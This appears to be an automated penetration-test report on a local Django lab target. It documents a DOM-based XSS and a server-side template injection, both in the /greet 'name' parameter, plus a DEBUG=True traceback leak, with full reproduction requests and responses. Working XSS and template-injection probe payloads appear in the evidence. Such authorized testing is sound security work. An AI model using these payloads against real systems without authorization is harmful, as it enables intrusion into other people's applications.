# VERDICT Security Assessment Report

## Contents

- [Assessment Information](#assessment-information)
- [Scope](#scope)
- [Summary](#summary)
- [Findings](#findings)
    - [1. HIGH — xss-reflected DOM-based XSS via `name` parameter on /greet](#finding-1)
    - [2. HIGH — burp✓ Server-side template injection](#finding-2)
    - [3. MEDIUM — info-disclosure Django DEBUG=True — full traceback/debug page exposed to unauthenticated users on /admin/login/](#finding-3)
    - [4. INFO — burp Input returned in response (reflected) (3 URLs)](#finding-4)

## Assessment Information

| | |
|---|---|
| Assessment ID | `a-mqxdqs7b-ve4m6g` |
| Target | http://target.local:32787/ |
| Started | 2026-06-28T06:00:19.548Z |
| Generated | 2026-07-02T00:00:00.000Z |
| Phase | report |
| Screens | 3 mapped · 3 scanned · 0 remaining |
| Hypotheses | 0 (0 confirmed) |
| Findings | 4 |
| Tooling | VERDICT |

## Scope

- **In-scope hosts**: `target.local:32787`
- **Out-of-scope hosts**: —
- **In-scope paths**: `/`
- **Out-of-scope paths**: —
- **Rate**: 30 req/min, max 2 concurrent

## Summary

4 finding(s): 2 high, 1 medium, 1 info

## Findings

<a id="finding-1"></a>

### 1. [HIGH] [xss-reflected] DOM-based XSS via `name` parameter on /greet

- Screen: `s-0001`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32787/

The `/greet` endpoint reflects the `name` query parameter into a DOM sink without HTML-escaping. A crafted URL such as `/greet?name=<img src=x onerror=...>` causes arbitrary JavaScript to execute in the victim's browser. `probe_xss` (server-side check) returned clean because the raw payload is not echoed in the HTTP response body; the injection occurs client-side where the value is written into the DOM via an innerHTML-equivalent sink, as confirmed by `probe_dom_xss` executing in a real Chromium browser both replay runs.

**Reproduction**

```
1. Open http://target.local:32787/greet?name=<img src=x onerror="alert(1)"> in any browser.
2. Observe the alert fires — the `name` value is inserted unescaped into the DOM.
3. Repeat to confirm repeatability (two independent runs both executed the payload marker).
```

**Evidence**

- Evidence `ev-mqxdtw9p-5` — `artifacts/s-0001/ev-mqxdtw9p-5/`

Request:

```http
GET /greet?name=verdictdomXmqxdtvfucmy7safe HTTP/1.1
Host: target.local:32787
```

Response:

```http
HTTP/1.1 200
content-type: text/html

no execution — payload was not run by the browser (escaped / not a live sink)
```

- Evidence `ev-mqxdtx3d-6` — `artifacts/s-0001/ev-mqxdtx3d-6/`

Request:

```http
GET /greet?name=%22%3E%3Cimg%20src%3Dx%20onerror%3D%22window.__verdict_xss%3D%27domXmqxdtvfucmy7%27%3Balert(%27domXmqxdtvfucmy7%27)%22%3E HTTP/1.1
Host: target.local:32787
```

Response:

```http
HTTP/1.1 200
content-type: text/html

XSS EXECUTED — sink fired (onerror/onload set window.__verdict_xss=domXmqxdtvfucmy7) [domXmqxdtvfucmy7]
```

- Evidence `ev-mqxdtxwm-7` — `artifacts/s-0001/ev-mqxdtxwm-7/`

Request:

```http
GET /greet?name=%22%3E%3Cimg%20src%3Dx%20onerror%3D%22window.__verdict_xss%3D%27domXmqxdtvfucmy7%27%3Balert(%27domXmqxdtvfucmy7%27)%22%3E HTTP/1.1
Host: target.local:32787
```

Response:

```http
HTTP/1.1 200
content-type: text/html

XSS EXECUTED — sink fired (onerror/onload set window.__verdict_xss=domXmqxdtvfucmy7) [domXmqxdtvfucmy7]
```

<a id="finding-2"></a>

### 2. [HIGH] [burp✓] Server-side template injection

- Screen: `(cross-screen)`
- Source: validator `burp`
- Scope basis: burp scan (in-scope)

✅ AI-verified by active re-test: Control 'AAA1000add337BBB' reflected literally (no 1337), while the Django template payload {{1000|add:337}} rendered 'AAA1337BBB' identically on two replays — server-side evaluation of the template expression confirmed.

The <b>name</b> parameter appears to be vulnerable to server-side template injection attacks. The template engine appears to be <b>Django</b>.<br><br>The payload <b>r6bd4{{345|add:135}}lkuxn</b> was submitted in the name parameter. This payload contains a Django template statement.<br><br>The server response contained the string <b>r6bd4480lkuxn</b>. This indicates that the payload is being interpreted by a server-side template engine. (confidence: CERTAIN) @ http://target.local:32787/greet/

**Reproduction**

```
Burp が検出。証拠に request/response(Cookie/Authorization は伏字)。
```

**Evidence**

- Evidence `ev-mqxe65nz-s` — `artifacts/_/ev-mqxe65nz-s/`

Request:

```http
GET /greet/ HTTP/1.1
Host: target.local:32787

GET /greet/?name=r6bd4%7b%7b345%7cadd%3a135%7d%7dlkuxn HTTP/1.1
Host: target.local:32787
Accept: */*
```

Response:

```http
HTTP/1.1 0

HTTP/1.1 200 OK
Date: Sun, 28 Jun 2026 06:08:29 GMT
Server: WSGIServer/0.2 CPython/3.9.25
Content-Type: text/html; charset=utf-8
X-Frame-Options: DENY
Content-Length: 55
X-Content-Type-Options: nosniff
Referrer-Policy: same-origin

<html><body><h1>Hello, r6bd4480lkuxn</h1></body></html>
```

- Evidence `ev-mqxe6rmw-t` — `artifacts/_/ev-mqxe6rmw-t/`

Request:

```http
GET /greet/?name=AAA1000add337BBB HTTP/1.1
Host: target.local:32787
user-agent: verdict-scanner/0.1
```

Response:

```http
HTTP/1.1 200
content-length: 58
content-type: text/html; charset=utf-8
date: Sun, 28 Jun 2026 06:12:45 GMT
referrer-policy: same-origin
server: WSGIServer/0.2 CPython/3.9.25
x-content-type-options: nosniff
x-frame-options: DENY

<html><body><h1>Hello, AAA1000add337BBB</h1></body></html>
```

- Evidence `ev-mqxe6t6l-u` — `artifacts/_/ev-mqxe6t6l-u/`

Request:

```http
GET /greet/?name=AAA%7b%7b1000%7cadd%3a337%7d%7dBBB HTTP/1.1
Host: target.local:32787
user-agent: verdict-scanner/0.1
```

Response:

```http
HTTP/1.1 200
content-length: 52
content-type: text/html; charset=utf-8
date: Sun, 28 Jun 2026 06:12:47 GMT
referrer-policy: same-origin
server: WSGIServer/0.2 CPython/3.9.25
x-content-type-options: nosniff
x-frame-options: DENY

<html><body><h1>Hello, AAA1337BBB</h1></body></html>
```

- Evidence `ev-mqxe6uq7-v` — `artifacts/_/ev-mqxe6uq7-v/`

Request:

```http
GET /greet/?name=AAA%7b%7b1000%7cadd%3a337%7d%7dBBB HTTP/1.1
Host: target.local:32787
user-agent: verdict-scanner/0.1
```

Response:

```http
HTTP/1.1 200
content-length: 52
content-type: text/html; charset=utf-8
date: Sun, 28 Jun 2026 06:12:49 GMT
referrer-policy: same-origin
server: WSGIServer/0.2 CPython/3.9.25
x-content-type-options: nosniff
x-frame-options: DENY

<html><body><h1>Hello, AAA1337BBB</h1></body></html>
```

<a id="finding-3"></a>

### 3. [MEDIUM] [info-disclosure] Django DEBUG=True — full traceback/debug page exposed to unauthenticated users on /admin/login/

- Screen: `s-0003`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32787/

The application runs with Django DEBUG=True in production. A login POST to /admin/login/ triggers a backend database failure (OperationalError), and instead of a generic error page the server returns Django's full technical-500 debug template (HTTP 500, ~65 KB). This page is only rendered when DEBUG=True and discloses, to an UNAUTHENTICATED attacker: the exception type and message, the complete Python traceback with application source-code snippets, per-frame local variables (which can include submitted credentials and SQL), the Django settings dump, installed apps, middleware, Django/Python versions, and absolute filesystem paths. This is OWASP A05 Security Misconfiguration and substantially aids further exploitation (reconnaissance of internal structure, paths, and config). The underlying OperationalError additionally signals a misconfigured/unavailable database backend. Confirmed: a normal GET /admin/login/ returns the ordinary 200 login form (2201 bytes, no traceback) as the negative control, while the error-triggering POST returns the 500 debug traceback (65512 bytes, title "OperationalError at /admin/login/") repeatably.

**Reproduction**

```
1) Negative control: GET http://target.local:32787/admin/login/ → 200, normal login page (2201 bytes), no traceback (ev-mqxdxi0h-k). 2) Obtain a matching csrftoken cookie + csrfmiddlewaretoken form value from that page. 3) POST http://target.local:32787/admin/login/ with Content-Type application/x-www-form-urlencoded and body csrfmiddlewaretoken=<token>&username=admin&password=<any>&next=/admin/ → server raises OperationalError and returns the full Django DEBUG traceback page (HTTP 500, 65512 bytes, title "OperationalError at /admin/login/"). 4) Reproduced identically across 6 consecutive attempts (ev-mqxdy4ky-l, ev-mqxdy5x8-m, ev-mqxdy83m-n, ...). The 500 debug template only renders with DEBUG=True.
```

**Evidence**

- Evidence `ev-mqxdxi0h-k` — `artifacts/s-0003/ev-mqxdxi0h-k/`

Request:

```http
GET /admin/login/ HTTP/1.1
Host: target.local:32787
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
cache-control: max-age=0, no-cache, no-store, must-revalidate, private
content-length: 2201
content-type: text/html; charset=utf-8
date: Sun, 28 Jun 2026 06:05:32 GMT
expires: Sun, 28 Jun 2026 06:05:32 GMT
referrer-policy: same-origin
server: WSGIServer/0.2 CPython/3.9.25
set-cookie: <redacted>
vary: Cookie
x-content-type-options: nosniff
x-frame-options: DENY

<!DOCTYPE html>

<html lang="en-us" dir="ltr">
<head>
<title>Log in | Django site admin</title>
<link rel="stylesheet" type="text/css" href="/static/admin/css/base.css">

  <link rel="stylesheet" type="text/css" href="/static/admin/css/nav_sidebar.css">
  <script src="/static/admin/js/nav_sidebar.js" defer></script>

<link rel="stylesheet" type="text/css" href="/static/admin/css/login.css">





    <meta name="viewport" content="user-scalable=no, width=device-width, initial-scale=1.0, maximum-scale=1.0">
    <link rel="stylesheet" type="text/css" href="/static/admin/css/responsive.css">
    

<meta name="robots" content="NONE,NOARCHIVE">
</head>


<body class=" login"
  data-admin-utc-offset="0">

<!-- Container -->
<div id="container">

    
    <!-- Header -->
    <div id="header">
        <div id="branding">
        
<h1 id="site-name"><a href="/admin/">Django administration</a></h1>

        </div>
        
        
    </div>
    <!-- END Header -->
    
    

    <div class="main shifted" id="main">
      
        
      
      <div class="content">
        
          
        
        <!-- Content -->
        <div id="content" class="colM">
          
          
          
          




<div id="content-main">



<form action="/admin/login/" method="post" id="login-form"><input type="hidden" name="csrfmiddlewaretoken" value="UEwwsdMuQbIyhBxqF4syHLjreO2cF6nTSA8einmb9ZPchKfHlxAw8rSkmRjaas14">
  <div class="form-row">
    
    <label class="required" for="id_username">Username:</label> <input type="text" name="username" autofocus autocapitalize="none" autocomplete="username" maxlength="150" required id="id_username">
  </div>
  <div class="form-row">
    
    <label class="required" for="id_password">Password:</label> <input type="password" name="password" autocomplete="current-password" required id="id_password">
    <input type="hidden" name="next" value="/admin/">
  </div>
  
  
  <div class="submit-row">
    <input type="submit" value="Log in">
  </div>
</form>

</div>

          
          <br class="clear">
        </div>
        <!-- END Content -->
        <div id="footer"></div>
      </div>
    </div>
</div>
<!-- END Container -->
</body>
</html>
```

- Evidence `ev-mqxdy4ky-l` — `artifacts/s-0003/ev-mqxdy4ky-l/`

Request:

```http
POST /admin/login/ HTTP/1.1
Host: target.local:32787
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
Content-Type: application/x-www-form-urlencoded

csrfmiddlewaretoken=UEwwsdMuQbIyhBxqF4syHLjreO2cF6nTSA8einmb9ZPchKfHlxAw8rSkmRjaas14&username=admin&password=wrongpass1&next=/admin/
```

Response (truncated):

```http
HTTP/1.1 500
content-length: 219475
content-type: text/html
date: Sun, 28 Jun 2026 06:06:01 GMT
referrer-policy: same-origin
server: WSGIServer/0.2 CPython/3.9.25
vary: Cookie
x-content-type-options: nosniff
x-frame-options: DENY

<!DOCTYPE html>
<html lang="en">
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <meta name="robots" content="NONE,NOARCHIVE">
  <title>OperationalError
          at /admin/login/</title>
  <style type="text/css">
    html * { padding:0; margin:0; }
    body * { padding:10px 20px; }
    body * * { padding:0; }
    body { font:small sans-serif; background-color:#fff; color:#000; }
    body>div { border-bottom:1px solid #ddd; }
    h1 { font-weight:normal; }
    h2 { margin-bottom:.8em; }
    h3 { margin:1em 0 .5em 0; }
    h4 { margin:0 0 .5em 0; font-weight: normal; }
    code, pre { font-size: 100%; white-space: pre-wrap; }
    table { border:1px solid #ccc; border-collapse: collapse; width:100%; background:white; }
    tbody td, tbody th { vertical-align:top; padding:2px 3px; }
    thead th {
      padding:1px 6px 1px 3px; background:#fefefe; text-align:left;
      font-weight:normal; font-size:11px; border:1px solid #ddd;
    }
    tbody th { width:12em; text-align:right; color:#666; padding-right:.5em; }
    table.vars { margin:5px 0 2px 40px; }
    table.vars td, table.req td { font-family:monospace; }
    table td.code { width:100%; }
    table td.code pre { overflow:hidden; }
    table.source th { color:#666; }
    table.source td { font-family:monospace; white-space:pre; border-bottom:1px solid #eee; }
    ul.traceback { list-style-type:none; color: #222; }
    ul.traceback li.frame { padding-bottom:1em; color:#4f4f4f; }
    ul.traceback li.user { background-color:#e0e0e0; color:#000 }
    div.context { padding:10px 0; overflow:hidden; }
    div.context ol { padding-left:30px; margin:0 10px; list-style-position: inside; }
    div.context ol li { font-family:monospace; white-space:pre; color:#777; cursor:pointer; padding-left: 2px; }
    div.context ol li pre { display:inline; }
    div.context ol.context-line li { color:#464646; background-color:#dfdfdf; padding: 3px 2px; }
    div.context ol.context-line li span { position:absolute; right:32px; }
    .user div.context ol.context-line li { background-color:#bbb; color:#000; }
    .user div.context ol li { color:#666; }
    div.commands { margin-left: 40px; }
    div.commands a { color:#555; text-decoration:none; }
    .user div.commands a { color: black; }
    #summary { background: #ffc; }
    #summary h2 { font-weight: normal; color: #666; }
    #explanation { background:#eee; }
    #template, #template-not-exist { background:#f6f6f6; }
    #template-not-exist ul { margin: 0 0 10px 20px; }
    #template-not-exist .postmortem-section { margin-bottom: 3px; }
    #unicode-hint { background:#eee; }
    #traceback { background:#eee; }
    #requestinfo { background:#f6f6f6; padding-left:120px; }
    #summary table { border:none; background:transparent; }
    #requestinfo h2, #requestinfo h3 { position:relative; margin-left:-100px; }
    #requestinfo h3 { margin-bottom:-1em; }
    .error { background: #ffc; }
    .specific { color:#cc3300; font-weight:bold; }
    h2 span.commands { font-size:.7em; font-weight:normal; }
    span.commands a:link {color:#5E5694;}
    pre.exception_value { font-family: sans-serif; color: #575757; font-size: 1.5em; margin: 10px 0 10px 0; }
    .append-bottom { margin-bottom: 10px; }
    .fname { user-select: all; }
  </style>
  
  <script>
    function hideAll(elems) {
      for (var e = 0; e < elems.length; e++) {
        elems[e].style.display = 'none';
      }
    }
    window.onload = function() {
      hideAll(document.querySelectorAll('table.vars'));
      hideAll(document.querySelectorAll('ol.pre-context'));
      hideAll(document.querySelectorAll('ol.post-context'));
      hideAll(document.querySelectorAll('div.pastebin'));
    }
    function toggle() {
      for (var i = 0; i < arguments.length; i++) {
        var e = document.getElementById(arguments[i]);
        if (e) {
          e.style.display = e.style.display == 'none' ? 'block': 'none';
        }
      }
      return false;
    }
    function varToggle(link, id) {
      toggle('v' + id);
      var s = link.getElementsByTagName('span')[0];
      var uarr = String.fromCharCode(0x25b6);
      var darr = String.fromCharCode(0x25bc);
      s.textContent = s.textContent == uarr ? darr : uarr;
      return false;
    }
    function switchPastebinFriendly(link) {
      s1 = "Switch to copy-and-paste view";
      s2 = "Switch back to interactive view";
      link.textContent = link.textContent.trim() == s1 ? s2: s1;
      toggle('browserTraceback', 'pastebinTraceback');
      return false;
    }
  </script>
  
</head>
<body>
<div id="summary">
  <h1>OperationalError
       at /admin/login/</h1>
  <pre class="exception_value">no such table: auth_user</pre>
  <table class="meta">

    <tr>
      <th>Request Method:</th>
      <td>POST</td>
    </tr>
    <tr>
      <th>Request URL:</th>
      <td>http://target.local:32787/admin/login/</td>
    </tr>

    <tr>
      <th>Django Version:</th>
      <td>3.2</td>
    </tr>

    <tr>
      <th>Exception Type:</th>
      <td>OperationalError</td>
    </tr>


    <tr>
      <th>Exception Value:</th>
      <td><pre>no such table: auth_user</pre></td>
    </tr>


    <tr>
      <th>Exception Location:</th>
      <td><span class="fname">/usr/local/lib/python3.9/site-packages/django/db/backends/sqlite3/base.py</span>, line 423, in execute</td>
    </tr>

    <tr>
      <th>Python Executable:</th>
      <td>/usr/local/bin/python</td>
    </tr>
    <tr>
      <th>Python Version:</th>
      <td>3.9.25</td>
    </tr>
    <tr>
      <th>Python Path:</th>
      <td><pre>[&#x27;/app&#x27;,
 &#x27;/usr/local/lib/python39.zip&#x27;,
 &#x27;/usr/local/lib/python3.9&#x27;,
 &#x27;/usr/local/lib/python3.9/lib-dynload&#x27;,
 &#x27;/usr/local/lib/python3.9/site-packages&#x27;,
 &#x27;/usr/local/lib/python3.9/site-packages/setuptools/_vendor&#x27;]</pre></td>
    </tr>
    <tr>
      <th>Server time:</th>
      <td>Sun, 28 Jun 2026 06:06:01 +0000</td>
    </tr>
  </table>
</div>




<div id="traceback">
  <h2>Traceback <span class="commands"><a href="#" onclick="return switchPastebinFriendly(this);">
    Switch to copy-and-paste view</a></span>
  </h2>
  <div id="browserTraceback">
    <ul class="traceback">
      
        
        <li class="frame django">
          
            <code class="fname">/usr/local/lib/python3.9/site-packages/django/db/backends/utils.py</code>, line 84, in _execute
          

          
            <div class="context" id="c136281539350656">
              
                <ol start="77" class="pre-context" id="pre136281539350656">
                
                  <li onclick="toggle('pre136281539350656', 'post136281539350656')"><pre>    def _execute(self, sql, params, *ignored_wrapper_args):</pre></li>
                
                  <li onclick="toggle('pre136281539350656', 'post136281539350656')"><pre>        self.db.validate_no_broken_transaction()</pre></li>
                
                  <li onclick="toggle('pre136281539350656', 'post136281539350656')"><pre>        with self.db.wrap_database_errors:</pre></li>
                
                  <li onclick="toggle('pre136281539350656', 'post136281539350656')"><pre>            if params is None:</pre></li>
                
                  <li onclick="toggle('pre136281539350656', 'post136281539350656')"><pre>                # params default might be backend specific.</pre></li>
                
                  <li onclick="toggle('pre136281539350656', 'post136281539350656')"><pre>                return self.cursor.execute(sql)</pre></li>
                
                  <li onclick="toggle('pre136281539350656', 'post136281539350656')"><pre>            else:</pre></li>
                
                </ol>
              
              <ol start="84" class="context-line">
                <li onclick="toggle('pre136281539350656', 'post136281539350656')"><pre>                return self.cursor.execute(sql, params)</pre> <span>…</span></li>
              </ol>
              
                <ol start='85' class="post-context" id="post136281539350656">
                  
                  <li onclick="toggle('pre136281539350656', 'post136281539350656')"><pre></pre></li>
                  
                  <li onclick="toggle('pre136281539350656', 'post136281539350656')"><pre>    def _executemany(self, sql, param_list, *ignored_wrapper_args):</pre></li>
                  
                  <li onclick="toggle('pre136281539350656', 'post136281539350656')"><pre>        self.db.validate_no_broken_transaction()</pre></li>
                  
                  <li onclick="toggle('pre136281539350656', 'post136281539350656')"><pre>        with self.db.wrap_database_errors:</pre></li>
                  
                  <li onclick="toggle('pre136281539350656', 'post136281539350656')"><pre>            return self.cursor.executemany(sql, param_list)</pre></li>
                  
                  <li onclick="toggle('pre136281539350656', 'post136281539350656')"><pre></pre></li>
                  
              </ol>
              
            </div>
          

          
            <div class="commands">
                
                    <a href="#" onclick="return varToggle(this, '136281539350656')"><span>&#x25b6;</span> Local vars</a>
                
            </div>
            <table class="vars" id="v136281539350656">
              <thead>
                <tr>
                  <th>Variable</th>
                  <th>Value</th>
                </tr>
              </thead>
              <tbody>
                
                  <tr>
                    <td>ignored_wrapper_args</td>
                    <td class="code"><pre>(False,
 {&#x27;connection&#x27;: &lt;django.db.backends.sqlite3.base.DatabaseWrapper object at 0x7bf284369130&gt;,
  &#x27;cursor&#x27;: &lt;django.db.backends.utils.CursorDebugWrapper object at 0x7bf284bdf490&gt;})</pre></td>
                  </tr>
                
                  <tr>
                    <td>params</td>
                    <td class="code"><pre>(&#x27;admin&#x27;,)</pre></td>
                  </tr>
                
                  <tr>
                    <td>self</td>
                    <td class="code"><pre>&lt;django.db.backends.utils.CursorDebugWrapper object at 0x7bf284bdf490&gt;</pre></td>
                  </tr>
                
                  <tr>
                    <td>sql</td>
                    <td class="code"><pre>(&#x27;SELECT &quot;auth_user&quot;.&quot;id&quot;, &quot;auth_user&quot;.&quot;password&quot;, &quot;auth_user&quot;.&quot;last_login&quot;, &#x27;
 &#x27;&quot;auth_user&quot;.&quot;is_superuser&quot;, &quot;auth_user&quot;.&quot;username&quot;, &#x27;
 &#x27;&quot;auth_user&quot;.&quot;first_name&quot;, &quot;auth_user&quot;.&quot;last_name&quot;, &quot;auth_user&quot;.&quot;email&quot;, &#x27;
 &#x27;&quot;auth_user&quot;.&quot;is_staff&quot;, &quot;auth_user&quot;.&quot;is_active&quot;, &quot;auth_user&quot;.&quot;date_joined&quot; &#x27;
 &#x27;FROM &quot;auth_user&quot; WHERE &quot;auth_user&quot;.&quot;username&quot; = %s LIMIT 21&#x27;)</pre></td>
                  </tr>
                
              </tbody>
            </table>
          
        </li>
      
        
        <li class="frame django">
          
            <code class="fname">/usr/local/lib/python3.9/site-packages/django/db/backends/sqlite3/base.py</code>, line 423, in execute
          

          
            <div class="context" id="c136281539351040">
              
                <ol start="416" class="pre-context" id="pre136281539351040">
                
                  <li onclick="toggle('pre136281539351040', 'post136281539351040')"><pre>    This fixes it -- but note that if you want to use a literal &quot;%s&quot; in a query,</pre></li>
                
                  <li onclick="toggle('pre136281539351040', 'post136281539351040')"><pre>    you&#x27;ll need to use &quot;%%s&quot;.</pre></li>
                
                  <li onclick="toggle('pre136281539351040', 'post136281539351040')"><pre>    &quot;&quot;&quot;</pre></li>
                
                  <li onclick="toggle('pre136281539351040', 'post136281539351040')"><pre>    def execute(self, query, params=None):</pre></li>
                
                  <li onclick="toggle('pre136281539351040', 'post136281539351040')"><pre>        if params is None:</pre></li>
                
                  <li onclick="toggle('pre136281539351040', 'post136281539351040')"><pre>            return Database.Cursor.execute(self, query)</pre></li>
                
                  <li onclick="toggle('pre136281539351040', 'post136281539351040')"><pre>        query = self.convert_query(query)</pre></li>
                
                </ol>
              
              <ol start="423" class="context-line">
                <li onclick="toggle('pre136281539351040', 'post136281539351040')"><pre>        return Database.Cursor.execute(self, query, params)</pre> <span>…</span></li>
              </ol>
              
                <ol start='424' class="post-context" id="post136281539351040">
                  
                  <li onclick="toggle('pre136281539351040', 'post136281539351040')"><pre></pre></li>
                  
                  <li onclick="toggle('pre136281539351040', 'post136281539351040')"><pre>    def executemany(self, query, param_list):</pre></li>
                  
                  <li onclick="toggle('pre136281539351040', 'post136281539351040')"><pre>        query = self.convert_query(query)</pre></li>
                  
                  <li onclick="toggle('pre136281539351040', 'post136281539351040')"><pre>        return Database.Cursor.executemany(self, query, param_list)</pre></li>
                  
                  <li onclick="toggle('pre136281539351040', 'post136281539351040')"><pre></pre></li>
                  
                  <li onclick="toggle('pre136281539351040', 'post136281539351040')"><pre>    def convert_query(self, query):</pre></li>
                  
              </ol>
              
            </div>
          

          
            <div class="commands">
                
                    <a href="#" onclick="return varToggle(this, '136281539351040')"><span>&#x25b6;</span> Local vars</a>
                
            </div>
            <table class="vars" id="v136281539351040">
              <thead>
                <tr>
                  <th>Variable</th>
                  <th>Value</th>
                </tr>
              </thead>
              <tbody>
                
                  <tr>
                    <td>params</td>
                    <td class="code"><pre>(&#x27;admin&#x27;,)</pre></td>
                  </tr>
                
                  <tr>
                    <td>query</td>
                    <td class="code"><pre>(&#x27;SELECT &quot;auth_user&quot;.&quot;id&quot;, &quot;auth_user&quot;.&quot;password&quot;, &quot;auth_user&quot;.&quot;last_login&quot;, &#x27;
 &#x27;&quot;auth_user&quot;.&quot;is_superuser&quot;, &quot;auth_user&quot;.&quot;username&quot;, &#x27;
 &#x27;&quot;auth_user&quot;.&quot;first_name&quot;, &quot;auth_user&quot;.&quot;last_name&quot;, &quot;auth_user&quot;.&quot;email&quot;, &#x27;
 &#x27;&quot;auth_user&quot;.&quot;is_staff&quot;, &quot;auth_user&quot;.&quot;is_active&quot;, &quot;auth_user&quot;.&quot;date_joined&quot; &#x27;
 &#x27;FROM &quot;auth_user&quot; WHERE &quot;auth_user&quot;.&quot;username&quot; = ? LIMIT 21&#x27;)</pre></td>
                  </tr>
                
                  <tr>
                    <td>self</td>
                    <td class="code"><pre>&lt;django.db.backends.sqlite3.base.SQLiteCursorWrapper object at 0x7bf2842bd160&gt;</pre></td>
                  </tr>
                
              </tbody>
            </table>
          
        </li>
      
        
          <li><h3>
          
            The above exception (no such table: auth_user) was the direct cause of the following exception:
          
        </h3></li>
        
        <li class="frame django">
          
            <code
```

- Evidence `ev-mqxdy5x8-m` — `artifacts/s-0003/ev-mqxdy5x8-m/`

Request:

```http
POST /admin/login/ HTTP/1.1
Host: target.local:32787
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
Content-Type: application/x-www-form-urlencoded

csrfmiddlewaretoken=UEwwsdMuQbIyhBxqF4syHLjreO2cF6nTSA8einmb9ZPchKfHlxAw8rSkmRjaas14&username=admin&password=wrongpass2&next=/admin/
```

Response (truncated):

```http
HTTP/1.1 500
content-length: 219475
content-type: text/html
date: Sun, 28 Jun 2026 06:06:03 GMT
referrer-policy: same-origin
server: WSGIServer/0.2 CPython/3.9.25
vary: Cookie
x-content-type-options: nosniff
x-frame-options: DENY

<!DOCTYPE html>
<html lang="en">
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <meta name="robots" content="NONE,NOARCHIVE">
  <title>OperationalError
          at /admin/login/</title>
  <style type="text/css">
    html * { padding:0; margin:0; }
    body * { padding:10px 20px; }
    body * * { padding:0; }
    body { font:small sans-serif; background-color:#fff; color:#000; }
    body>div { border-bottom:1px solid #ddd; }
    h1 { font-weight:normal; }
    h2 { margin-bottom:.8em; }
    h3 { margin:1em 0 .5em 0; }
    h4 { margin:0 0 .5em 0; font-weight: normal; }
    code, pre { font-size: 100%; white-space: pre-wrap; }
    table { border:1px solid #ccc; border-collapse: collapse; width:100%; background:white; }
    tbody td, tbody th { vertical-align:top; padding:2px 3px; }
    thead th {
      padding:1px 6px 1px 3px; background:#fefefe; text-align:left;
      font-weight:normal; font-size:11px; border:1px solid #ddd;
    }
    tbody th { width:12em; text-align:right; color:#666; padding-right:.5em; }
    table.vars { margin:5px 0 2px 40px; }
    table.vars td, table.req td { font-family:monospace; }
    table td.code { width:100%; }
    table td.code pre { overflow:hidden; }
    table.source th { color:#666; }
    table.source td { font-family:monospace; white-space:pre; border-bottom:1px solid #eee; }
    ul.traceback { list-style-type:none; color: #222; }
    ul.traceback li.frame { padding-bottom:1em; color:#4f4f4f; }
    ul.traceback li.user { background-color:#e0e0e0; color:#000 }
    div.context { padding:10px 0; overflow:hidden; }
    div.context ol { padding-left:30px; margin:0 10px; list-style-position: inside; }
    div.context ol li { font-family:monospace; white-space:pre; color:#777; cursor:pointer; padding-left: 2px; }
    div.context ol li pre { display:inline; }
    div.context ol.context-line li { color:#464646; background-color:#dfdfdf; padding: 3px 2px; }
    div.context ol.context-line li span { position:absolute; right:32px; }
    .user div.context ol.context-line li { background-color:#bbb; color:#000; }
    .user div.context ol li { color:#666; }
    div.commands { margin-left: 40px; }
    div.commands a { color:#555; text-decoration:none; }
    .user div.commands a { color: black; }
    #summary { background: #ffc; }
    #summary h2 { font-weight: normal; color: #666; }
    #explanation { background:#eee; }
    #template, #template-not-exist { background:#f6f6f6; }
    #template-not-exist ul { margin: 0 0 10px 20px; }
    #template-not-exist .postmortem-section { margin-bottom: 3px; }
    #unicode-hint { background:#eee; }
    #traceback { background:#eee; }
    #requestinfo { background:#f6f6f6; padding-left:120px; }
    #summary table { border:none; background:transparent; }
    #requestinfo h2, #requestinfo h3 { position:relative; margin-left:-100px; }
    #requestinfo h3 { margin-bottom:-1em; }
    .error { background: #ffc; }
    .specific { color:#cc3300; font-weight:bold; }
    h2 span.commands { font-size:.7em; font-weight:normal; }
    span.commands a:link {color:#5E5694;}
    pre.exception_value { font-family: sans-serif; color: #575757; font-size: 1.5em; margin: 10px 0 10px 0; }
    .append-bottom { margin-bottom: 10px; }
    .fname { user-select: all; }
  </style>
  
  <script>
    function hideAll(elems) {
      for (var e = 0; e < elems.length; e++) {
        elems[e].style.display = 'none';
      }
    }
    window.onload = function() {
      hideAll(document.querySelectorAll('table.vars'));
      hideAll(document.querySelectorAll('ol.pre-context'));
      hideAll(document.querySelectorAll('ol.post-context'));
      hideAll(document.querySelectorAll('div.pastebin'));
    }
    function toggle() {
      for (var i = 0; i < arguments.length; i++) {
        var e = document.getElementById(arguments[i]);
        if (e) {
          e.style.display = e.style.display == 'none' ? 'block': 'none';
        }
      }
      return false;
    }
    function varToggle(link, id) {
      toggle('v' + id);
      var s = link.getElementsByTagName('span')[0];
      var uarr = String.fromCharCode(0x25b6);
      var darr = String.fromCharCode(0x25bc);
      s.textContent = s.textContent == uarr ? darr : uarr;
      return false;
    }
    function switchPastebinFriendly(link) {
      s1 = "Switch to copy-and-paste view";
      s2 = "Switch back to interactive view";
      link.textContent = link.textContent.trim() == s1 ? s2: s1;
      toggle('browserTraceback', 'pastebinTraceback');
      return false;
    }
  </script>
  
</head>
<body>
<div id="summary">
  <h1>OperationalError
       at /admin/login/</h1>
  <pre class="exception_value">no such table: auth_user</pre>
  <table class="meta">

    <tr>
      <th>Request Method:</th>
      <td>POST</td>
    </tr>
    <tr>
      <th>Request URL:</th>
      <td>http://target.local:32787/admin/login/</td>
    </tr>

    <tr>
      <th>Django Version:</th>
      <td>3.2</td>
    </tr>

    <tr>
      <th>Exception Type:</th>
      <td>OperationalError</td>
    </tr>


    <tr>
      <th>Exception Value:</th>
      <td><pre>no such table: auth_user</pre></td>
    </tr>


    <tr>
      <th>Exception Location:</th>
      <td><span class="fname">/usr/local/lib/python3.9/site-packages/django/db/backends/sqlite3/base.py</span>, line 423, in execute</td>
    </tr>

    <tr>
      <th>Python Executable:</th>
      <td>/usr/local/bin/python</td>
    </tr>
    <tr>
      <th>Python Version:</th>
      <td>3.9.25</td>
    </tr>
    <tr>
      <th>Python Path:</th>
      <td><pre>[&#x27;/app&#x27;,
 &#x27;/usr/local/lib/python39.zip&#x27;,
 &#x27;/usr/local/lib/python3.9&#x27;,
 &#x27;/usr/local/lib/python3.9/lib-dynload&#x27;,
